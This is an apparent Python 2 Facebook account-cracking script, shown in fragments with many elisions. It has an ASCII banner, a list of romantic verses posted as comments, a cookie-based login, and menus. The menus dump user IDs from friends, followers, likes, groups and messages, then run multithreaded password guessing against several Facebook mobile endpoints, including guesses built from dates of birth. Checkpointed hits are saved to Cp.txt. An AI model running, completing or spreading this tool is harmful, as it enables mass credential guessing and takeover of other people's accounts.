...
""
# Can Recode But Don't Change
# Bot Comment Do you understand?
""
try:
    import requests
except ImportError:
...
\______   \ ____   ____    ____\_ |__ _____  _____  ________ \__    ___/____  
 |       _//  _ \ /    \  / ___\| __ \\__  \ \__  \ \___   /   |    | /     \ 
 |    |   (  <_> )   |  \/ /_/  > \_\ \/ __ \_/ __ \_/    /    |    ||  Y Y  \
 |____|_  /\____/|___|  /\___  /|___  (____  (____  /_____ \   |____||__|_|  /
        \/            \//_____/     \/     \/     \/      \/               \/ 
 [x]──────────────────────────────────────────[x]
"""
...
pantun = random.choice(["The blue sky looks sad, The color is blue and false green, Long distance grows longing, Wants to always be close to you.",
"Thousands of painters, Only one eats bread. Thousands of sweet girls, Only you in the heart.",
"Poetry of rhymes and hymns, the poet creates with full sense. You are still the most beautiful, in my life all the time.",
"Small fire from the stove. Small fire runs out of wood. I've been waiting for a long time, When did you say I Love You.",
"A name has a meaning, Look for a name carefully. Let me grieve, For him who is in the heart.",
"In the morning, drink herbs. In front of the house there is a basket of tofu. I'm a little embarrassed to tell you, I really love you.",
"Freshly picked salak fruit, pomegranate duku fruit. There are many beautiful women, only you I love.",
"If you want to plant sugar cane, plant it near the hibiscus tree. If you love me, just say I love you.",
"The soursop fruit is freshly picked. Duku fruit tastes sour. There are many beautiful girls, I only love you.",
...
"Eat rice with tofu, Drink with guava juice. Don't be far from me, I will always love you.",
"Walking to the city of France, Many houses lined up. Let me die at the end of the kris, As long as I get a sweet sister.",
"Even though it's just a guava fruit, but this can be mixed. Although rarely seen, but my love is only for you.",
"I'm drinking herbal medicine, drinking under the guava tree. I don't want to lose you, because I love you very much."])
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
# Can Be Added Don't Replace #
def cek_login():
	try:
	...
	love = random.choice(['❤️','💛','🤍','🤎','❣️','🖤','💔'])
	kata = 'Shanto Script User '
	kom = kata+love+'\n'+pantun+'\n'+waktu
...
def login():
    os.system('clear')
    print logo
    print(' [1] Login Use Cookies')
    print(' [2] Cara Get Cookies')
    print(' [0] Clerar')
    lg = raw_input('\n [*] Input : ')
    if lg == '':
        os.sys.exit()
	...
	jalan (' *You Will Be Redirected To The Browser')
	time.sleep(2)
...
def menu():
  ...
  print (' [*] Nama : '+nm)
  print (' [*] Ip Address : '+ip)
  print (' [*] Date of birth : '+ttl)

  print ('\n [1] Dump ID From Search Name (Dump Slow)')
  print (' [2] Dump ID From Friends (Dump Fast)')
  print (' [3] Dump ID From Public (Dump Fast/Slow)')
  print (' [4] Dump ID From Follower (Dump Fast)')
  print (' [5] Dump ID From Like (Dump Fast)')
  print (' [6] Dump ID From Group (Dump Slow)')
  print (' [7] Dump ID From Message (Dump Slow)')
...
class dump_grup:
    ...
    def extract(self, url):
        ...
        if len(self.glist) != 0:
            print '\n [•] You Have %s Group' % len(self.glist)
            print ' [1] Get Grub From Search Name'
            print ' [2] Enter Group ID/Manual'
            while True:
                c = raw_input(' [*] Input : ')
                if c == '':
                    continue
...
def metode():
    print ('\n [1] Method Crack mbasic.facebook.com')
    print (' [2] Method Crack m.facebook.com')
    print (' [3] Method Crack free.facebook.com')
    print (' [4] Method Crack group.facebook.com')
    md = raw_input(' [*] Input : ')
    if md == '':
        os.sys.exit()
    elif md == '1' or md == '01':
      ttl = raw_input('\n [*] Crack Use Date of Birth (y/n) : ')
      if ttl == '':
          menu()
      elif ttl == 'y' or ttl == 'Y':
          crack1()
		...
		if len(self.pw) ==0:
			...
			for i in self.fl:
				i.update({"pw":self.pw})
                        ...
                        print(' [•] Hasil Cp Results Saved In Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
